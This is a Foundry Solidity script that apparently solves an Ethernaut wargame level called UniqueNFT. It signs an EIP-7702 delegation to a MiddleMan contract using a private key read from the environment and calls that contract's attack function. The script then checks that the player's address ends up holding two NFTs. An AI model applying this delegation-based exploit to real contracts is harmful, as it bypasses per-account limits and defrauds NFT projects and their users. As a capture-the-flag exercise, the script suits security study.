pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/openzeppelin-ethernaut/UniqueNFT.sol";
import "test/openzeppelin-ethernaut/UniqueNFT.t.sol";

contract UniqueNFTScript is Script {
    function run() external {
        vm.startBroadcast();

        MiddleMan middleMan = new MiddleMan();
        UniqueNFT instance = UniqueNFT(vm.envAddress("UNIQUE_NFT"));

        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(middleMan),
            uint256(vm.envBytes32("PV_KEY"))
        );

        vm.attachDelegation(signedDelegation);

        address myAddress = vm.envAddress("MY_ADDRESS");
        MiddleMan(myAddress).attack(address(instance));
        require(instance.balanceOf(myAddress) == 2, "failed");

        vm.stopBroadcast();
    }
}
